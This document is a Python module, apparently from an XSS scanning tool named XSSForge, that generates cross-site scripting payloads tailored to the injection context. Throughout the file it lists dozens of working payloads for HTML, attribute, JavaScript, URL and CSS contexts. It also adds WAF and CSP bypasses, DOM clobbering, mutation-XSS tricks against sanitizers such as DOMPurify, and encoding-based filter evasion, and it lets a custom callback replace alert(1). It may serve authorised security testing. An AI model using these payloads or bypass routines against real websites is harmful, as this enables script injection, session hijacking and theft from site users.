"""
Context-aware payload generator for XSSForge.

Generates optimized XSS payloads based on detected context and filters.
Integrates advanced bypass techniques: filter evasion, CSP bypass, DOM clobbering, mXSS.
"""

from dataclasses import dataclass, field
from enum import Enum
from typing import Iterator

from xssforge.payloads.loader import PayloadLoader, get_loader
from xssforge.utils.encoding import Encoder
from xssforge.bypasses.filters import FilterEvasion
from xssforge.bypasses.csp import CSPBypass
from xssforge.bypasses.dom_clobbering import DOMClobbering
from xssforge.bypasses.mxss import MutationXSS


class XSSContext(Enum):
    """XSS injection context types."""
    HTML_BODY = "html_body"
    HTML_ATTRIBUTE_QUOTED = "html_attribute_quoted"
    HTML_ATTRIBUTE_UNQUOTED = "html_attribute_unquoted"
    HTML_ATTRIBUTE_SINGLE = "html_attribute_single"
    HTML_COMMENT = "html_comment"
    JAVASCRIPT_STRING = "javascript_string"
    JAVASCRIPT_STRING_SINGLE = "javascript_string_single"
    JAVASCRIPT_TEMPLATE = "javascript_template"
    JAVASCRIPT_CODE = "javascript_code"
    URL_HREF = "url_href"
    URL_SRC = "url_src"
    CSS_VALUE = "css_value"
    CSS_URL = "css_url"
    UNKNOWN = "unknown"


@dataclass
class FilteredChars:
    """Tracks which characters/strings are filtered."""
    blocked_chars: set[str] = field(default_factory=set)
    blocked_strings: set[str] = field(default_factory=set)
    encoded_chars: dict[str, str] = field(default_factory=dict)

    def is_blocked(self, payload: str) -> bool:
        """Check if payload contains blocked content."""
        for char in self.blocked_chars:
            if char in payload:
                return True
        for string in self.blocked_strings:
            if string.lower() in payload.lower():
                return True
        return False


@dataclass
class PayloadConfig:
    """Configuration for payload generation."""
    context: XSSContext = XSSContext.UNKNOWN
    filters: FilteredChars = field(default_factory=FilteredChars)
    waf: str | None = None
    auto_trigger_only: bool = True
    max_payloads: int = 50
    include_polyglots: bool = True
    include_bypasses: bool = True
    custom_callback: str = "alert(1)"
    # Advanced bypass options
    csp_header: str | None = None
    sanitizer: str | None = None  # "dompurify", "angular", "regex", etc.
    include_mxss: bool = True
    include_dom_clobbering: bool = True
    include_csp_bypass: bool = True
    aggressive_mode: bool = False  # Use ALL evasion techniques


class PayloadGenerator:
    """Generates context-aware XSS payloads with advanced bypass techniques."""

    def __init__(self, loader: PayloadLoader | None = None):
        self.loader = loader or get_loader()
        self.encoder = Encoder()
        # Advanced bypass modules
        self.filter_evasion = FilterEvasion()
        self.csp_bypass = CSPBypass()
        self.dom_clobbering = DOMClobbering()
        self.mxss = MutationXSS()

    def generate(self, config: PayloadConfig) -> list[str]:
        """Generate payloads based on configuration with advanced bypass techniques."""
        payloads = []

        # Get base payloads for context
        base_payloads = self._get_context_payloads(config.context)

        # Add WAF bypass variants if WAF detected
        if config.waf and config.include_bypasses:
            waf_payloads = self._get_waf_payloads(config.waf)
            base_payloads.extend(waf_payloads)

        # Add polyglots
        if config.include_polyglots:
            base_payloads.extend(self.loader.get_polyglots())

        # Add mXSS/sanitizer bypass payloads
        if config.include_mxss:
            sanitizer = config.sanitizer or "unknown"
            mxss_payloads = self.mxss.get_for_sanitizer(sanitizer)
            base_payloads.extend(mxss_payloads)

        # Add DOM clobbering payloads
        if config.include_dom_clobbering:
            clobbering_payloads = list(self.dom_clobbering.generate_all())[:20]
            base_payloads.extend(clobbering_payloads)

        # Add CSP bypass payloads if CSP header provided
        if config.include_csp_bypass and config.csp_header:
            csp_payloads = self.csp_bypass.get_bypass_for_policy(config.csp_header, max_payloads=20)
            base_payloads.extend(csp_payloads)
        elif config.include_csp_bypass and config.aggressive_mode:
            # In aggressive mode, include CSP bypasses even without known CSP
            csp_payloads = list(self.csp_bypass.generate_all_bypasses())[:15]
            base_payloads.extend(csp_payloads)

        # Filter and deduplicate
        seen = set()
        for payload in base_payloads:
            if payload in seen:
                continue
            seen.add(payload)

            # Skip if blocked
            if config.filters.is_blocked(payload):
                # Try encoded variants using advanced filter evasion
                if config.include_bypasses:
                    # Use FilterEvasion module for comprehensive evasion
                    if config.aggressive_mode:
                        evasion_variants = self.filter_evasion.evade_all(payload)
                        for variant in evasion_variants:
                            if variant not in seen and not config.filters.is_blocked(variant):
                                payloads.append(variant)
                                seen.add(variant)
                                if len(payloads) >= config.max_payloads:
                                    break
                    else:
                        for variant in self._generate_bypass_variants(payload, config):
                            if variant not in seen and not config.filters.is_blocked(variant):
                                payloads.append(variant)
                                seen.add(variant)
                                if len(payloads) >= config.max_payloads:
                                    break
            else:
                payloads.append(payload)

            if len(payloads) >= config.max_payloads:
                break

        # Replace callback if custom
        if config.custom_callback != "alert(1)":
            payloads = [
                p.replace("alert(1)", config.custom_callback)
                .replace("alert`1`", config.custom_callback)
                for p in payloads
            ]

        return payloads[:config.max_payloads]

    def _get_context_payloads(self, context: XSSContext) -> list[str]:
        """Get payloads optimized for specific context."""
        if context == XSSContext.HTML_BODY:
            return self._html_body_payloads()
        elif context in (XSSContext.HTML_ATTRIBUTE_QUOTED, XSSContext.HTML_ATTRIBUTE_SINGLE):
            return self._attribute_breakout_payloads(context)
        elif context == XSSContext.HTML_ATTRIBUTE_UNQUOTED:
            return self._unquoted_attribute_payloads()
        elif context == XSSContext.HTML_COMMENT:
            return self._html_comment_payloads()
        elif context in (XSSContext.JAVASCRIPT_STRING, XSSContext.JAVASCRIPT_STRING_SINGLE):
            return self._javascript_string_payloads(context)
        elif context == XSSContext.JAVASCRIPT_TEMPLATE:
            return self._javascript_template_payloads()
        elif context == XSSContext.JAVASCRIPT_CODE:
            return self._javascript_code_payloads()
        elif context in (XSSContext.URL_HREF, XSSContext.URL_SRC):
            return self._url_context_payloads()
        elif context in (XSSContext.CSS_VALUE, XSSContext.CSS_URL):
            return self._css_context_payloads()
        else:
            return self.loader.get_basic_payloads()

    def _html_body_payloads(self) -> list[str]:
        """Payloads for HTML body context."""
        payloads = []

        # Auto-trigger payloads (no user interaction)
        for p in self.loader.get_auto_trigger_payloads():
            payloads.append(p.payload)

        # Add basic payloads
        payloads.extend([
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<video src=x onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
            "<img src=x onerror=alert`1`>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        ])

        return payloads

    def _attribute_breakout_payloads(self, context: XSSContext) -> list[str]:
        """Payloads to break out of HTML attributes."""
        quote = '"' if context == XSSContext.HTML_ATTRIBUTE_QUOTED else "'"
        other_quote = "'" if quote == '"' else '"'

        payloads = [
            f'{quote}><img src=x onerror=alert(1)>',
            f'{quote}><svg onload=alert(1)>',
            f'{quote}><script>alert(1)</script>',
            f'{quote} onmouseover=alert(1) x={quote}',
            f'{quote} onfocus=alert(1) autofocus x={quote}',
            f'{quote} onclick=alert(1) x={quote}',
            f'{quote}><input onfocus=alert(1) autofocus>',
            f'{quote}><details open ontoggle=alert(1)>',
            f'{quote}><img src=x onerror=alert`1`>',
            f'{quote}/><svg onload=alert(1)>',
            # Try opposite quote
            f'{other_quote}><img src=x onerror=alert(1)>',
            f'{other_quote}><svg onload=alert(1)>',
        ]

        # Add context-specific from loader
        for p in self.loader.get_context_payloads("attribute_breakout"):
            payloads.append(p)

        return payloads

    def _unquoted_attribute_payloads(self) -> list[str]:
        """Payloads for unquoted attribute values."""
        return [
            " onmouseover=alert(1) ",
            " onfocus=alert(1) autofocus ",
            " onclick=alert(1) ",
            " onload=alert(1) ",
            "><img src=x onerror=alert(1)>",
            "><svg onload=alert(1)>",
            "><script>alert(1)</script>",
            " autofocus onfocus=alert(1) ",
        ]

    def _html_comment_payloads(self) -> list[str]:
        """Payloads to break out of HTML comments."""
        return [
            "--><img src=x onerror=alert(1)>",
            "--!><img src=x onerror=alert(1)>",
            "--><!--><img src=x onerror=alert(1)>",
            "--><svg onload=alert(1)>",
            "--><script>alert(1)</script>",
        ]

    def _javascript_string_payloads(self, context: XSSContext) -> list[str]:
        """Payloads to break out of JavaScript strings."""
        quote = '"' if context == XSSContext.JAVASCRIPT_STRING else "'"

        payloads = [
            f"{quote};alert(1)//",
            f"{quote};alert(1);{quote}",
            f"{quote}+alert(1)+{quote}",
            f"{quote}-alert(1)-{quote}",
            f"\\{quote};alert(1)//",
            f"</script><script>alert(1)</script>",
            f"</script><img src=x onerror=alert(1)>",
            f"{quote});alert(1)//",
            f"{quote}]}};alert(1)//",
        ]

        # Add from loader
        for p in self.loader.get_context_payloads("javascript_string_breakout"):
            payloads.append(p)

        return payloads

    def _javascript_template_payloads(self) -> list[str]:
        """Payloads for JavaScript template literals."""
        return [
            "${alert(1)}",
            "`-alert(1)-`",
            "${`${alert(1)}`}",
            "`+alert(1)+`",
            "${this.alert(1)}",
            "${window.alert(1)}",
            "${[].constructor.constructor('alert(1)')()}",
        ]

    def _javascript_code_payloads(self) -> list[str]:
        """Payloads for direct JavaScript code injection."""
        return [
            "alert(1)",
            "alert`1`",
            "prompt(1)",
            "confirm(1)",
            "(alert)(1)",
            "eval('alert(1)')",
            "setTimeout('alert(1)')",
            "setInterval('alert(1)',1000)",
            "Function('alert(1)')()",
            "[].constructor.constructor('alert(1)')()",
            "window['alert'](1)",
            "this['alert'](1)",
        ]

    def _url_context_payloads(self) -> list[str]:
        """Payloads for URL contexts (href, src)."""
        return [
            "javascript:alert(1)",
            "javascript:alert`1`",
            "JaVaScRiPt:alert(1)",
            "java\tscript:alert(1)",
            "java\nscript:alert(1)",
            "&#x6A;avascript:alert(1)",
            "&#106;avascript:alert(1)",
            "javascript&colon;alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "javascript:/**/alert(1)",
            "javascript://anything%0aalert(1)",
        ]

    def _css_context_payloads(self) -> list[str]:
        """Payloads for CSS contexts."""
        return [
            "expression(alert(1))",
            "url(javascript:alert(1))",
            "</style><img src=x onerror=alert(1)>",
            "</style><script>alert(1)</script>",
            "-moz-binding:url('javascript:alert(1)')",
        ]

    def _get_waf_payloads(self, waf: str) -> list[str]:
        """Get WAF-specific bypass payloads."""
        payloads = []
        waf_bypasses = self.loader.get_waf_bypasses(waf)
        for bypass in waf_bypasses:
            payloads.append(bypass.get("payload", ""))
        return [p for p in payloads if p]

    def _generate_bypass_variants(
        self, payload: str, config: PayloadConfig
    ) -> Iterator[str]:
        """Generate encoded variants to bypass filters."""
        # Case variations
        yield from self._case_variants(payload)

        # URL encoding
        yield self.encoder.url_encode(payload)

        # Double URL encoding
        yield self.encoder.double_url_encode(payload)

        # HTML entities
        yield self.encoder.html_encode(payload)

        # Hex HTML entities
        yield self.encoder.hex_encode_html(payload)

        # Whitespace variants
        yield payload.replace(" ", "/")
        yield payload.replace(" ", "%09")
        yield payload.replace(" ", "%0a")
        yield payload.replace(" ", "%0d")

        # Null byte insertion
        yield self.encoder.insert_null_bytes(payload, "middle")

    def _case_variants(self, payload: str) -> Iterator[str]:
        """Generate case variation of payload."""
        # Mixed case for common blocked strings
        replacements = {
            "script": "ScRiPt",
            "onerror": "oNeRrOr",
            "onload": "oNlOaD",
            "javascript": "JaVaScRiPt",
            "alert": "aLeRt",
        }

        result = payload
        for original, replacement in replacements.items():
            if original in payload.lower():
                result = result.replace(original, replacement)
                result = result.replace(original.upper(), replacement)
                result = result.replace(original.capitalize(), replacement)

        if result != payload:
            yield result

        # Full uppercase
        yield payload.upper()

    def quick_payloads(self, context: XSSContext = XSSContext.UNKNOWN) -> list[str]:
        """Get a quick set of payloads for fast scanning."""
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<svg/onload=alert(1)>",
            "\"><img src=x onerror=alert(1)>",
            "'><img src=x onerror=alert(1)>",
            "<img src=x onerror=alert`1`>",
            "<details open ontoggle=alert(1)>",
            "javascript:alert(1)",
            "${alert(1)}",
        ]

    def comprehensive_payloads(self) -> list[str]:
        """Get comprehensive payload list for thorough testing."""
        all_payloads = set()

        # All tag payloads
        for p in self.loader.get_all_tag_payloads():
            all_payloads.add(p.payload)

        # All polyglots
        all_payloads.update(self.loader.get_polyglots())

        # All context-specific
        for context_payloads in self.loader.database.context_specific.values():
            all_payloads.update(context_payloads)

        # Basic payloads
        all_payloads.update(self.loader.get_basic_payloads())
        all_payloads.update(self.loader.get_stealth_payloads())

        return list(all_payloads)

    # ===== Advanced Bypass Methods =====

    def get_mxss_payloads(self, sanitizer: str = "unknown", max_count: int = 50) -> list[str]:
        """Get mutation XSS payloads for bypassing sanitizers."""
        payloads = self.mxss.get_for_sanitizer(sanitizer)
        return payloads[:max_count]

    def get_dompurify_bypasses(self) -> list[str]:
        """Get DOMPurify-specific bypass payloads."""
        return self.mxss.dompurify_bypasses()

    def get_dom_clobbering_payloads(self, max_count: int = 50) -> list[str]:
        """Get DOM clobbering attack payloads."""
        payloads = list(self.dom_clobbering.generate_all())
        return payloads[:max_count]

    def get_csp_bypass_payloads(self, csp_header: str = "", max_count: int = 30) -> list[str]:
        """Get CSP bypass payloads, optionally targeted for a specific CSP."""
        if csp_header:
            return self.csp_bypass.get_bypass_for_policy(csp_header, max_count)
        return list(self.csp_bypass.generate_all_bypasses())[:max_count]

    def analyze_csp(self, csp_header: str) -> dict:
        """Analyze CSP header for bypass opportunities."""
        return self.csp_bypass.analyze_csp(csp_header)

    def get_filter_evasion_payloads(
        self,
        base_payload: str = "<script>alert(1)</script>",
        context: str = "html_body"
    ) -> list[str]:
        """Get filter evasion variants of a payload."""
        payloads = self.filter_evasion.evade_all(base_payload)
        # Also add context-specific evasions
        for p in self.filter_evasion.generate_for_context(context):
            payloads.append(p)
        return list(dict.fromkeys(payloads))  # Dedupe

    def get_event_based_payloads(
        self,
        target_tag: str = "img",
        callback: str = "alert(1)"
    ) -> list[str]:
        """Generate payloads using various event handlers for a tag."""
        events = [
            "onerror", "onload", "onfocus", "onmouseover", "onclick",
            "onmouseenter", "oninput", "onanimationend", "onanimationstart",
            "ontoggle", "onbegin", "onstart", "onpointermove"
        ]
        payloads = []
        for event in events:
            payloads.append(f"<{target_tag} src=x {event}={callback}>")
            payloads.append(f"<{target_tag} {event}={callback}>")
            payloads.append(f"<{target_tag}/{event}={callback}>")
        return payloads

    def get_js_string_breakout_payloads(
        self,
        quote: str = "'",
        callback: str = "alert(1)"
    ) -> list[str]:
        """Get payloads specifically for breaking out of JS strings."""
        payloads = [
            f"{quote};{callback}//",
            f"{quote};{callback};{quote}",
            f"{quote}+{callback}+{quote}",
            f"{quote}-{callback}-{quote}",
            f"\\{quote};{callback}//",
            f"{quote});{callback}//",
            f"{quote}]);{callback}//",
            f"{quote}}});{callback}//",
            f"</script><script>{callback}</script>",
            f"</script><img src=x onerror={callback}>",
            # HTML entity breakout
            f"&apos;;{callback}//",
            f"&#x27;;{callback}//",
            # Unicode escape in JS
            f"\\u0027;{callback}//",
            f"\\x27;{callback}//",
        ]
        return payloads

    def get_attribute_breakout_payloads(
        self,
        quote: str = '"',
        callback: str = "alert(1)"
    ) -> list[str]:
        """Get payloads for breaking out of HTML attributes."""
        other_quote = "'" if quote == '"' else '"'
        payloads = [
            f'{quote}><img src=x onerror={callback}>',
            f'{quote}><svg onload={callback}>',
            f'{quote}><script>{callback}</script>',
            f'{quote} onmouseover={callback} x={quote}',
            f'{quote} onfocus={callback} autofocus x={quote}',
            f'{quote} onclick={callback} x={quote}',
            f'{quote}><input onfocus={callback} autofocus>',
            f'{quote}><details open ontoggle={callback}>',
            f'{quote}/><svg onload={callback}>',
            # Try opposite quote
            f'{other_quote}><img src=x onerror={callback}>',
            # Without closing the attribute (just add event)
            f' onmouseover={callback} ',
            f' onfocus={callback} autofocus ',
            # Backtick variant
            f'{quote}><img src=x onerror={callback.replace("(1)", "`1`")}>',
        ]
        return payloads

    def ultimate_payload_set(self, max_per_category: int = 20) -> list[str]:
        """Get the ultimate set of payloads combining all techniques."""
        all_payloads = []

        # Basic payloads
        all_payloads.extend(self.quick_payloads()[:max_per_category])

        # mXSS payloads
        all_payloads.extend(self.get_mxss_payloads(max_count=max_per_category))

        # DOM clobbering
        all_payloads.extend(self.get_dom_clobbering_payloads(max_count=max_per_category))

        # CSP bypasses (generic)
        all_payloads.extend(self.get_csp_bypass_payloads(max_count=max_per_category))

        # Filter evasion variants
        base_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
        for base in base_payloads:
            all_payloads.extend(self.filter_evasion.evade_all(base)[:10])

        # JS string breakout
        all_payloads.extend(self.get_js_string_breakout_payloads("'")[:10])
        all_payloads.extend(self.get_js_string_breakout_payloads('"')[:10])

        # Attribute breakout
        all_payloads.extend(self.get_attribute_breakout_payloads("'")[:10])
        all_payloads.extend(self.get_attribute_breakout_payloads('"')[:10])

        # Deduplicate
        return list(dict.fromkeys(all_payloads))
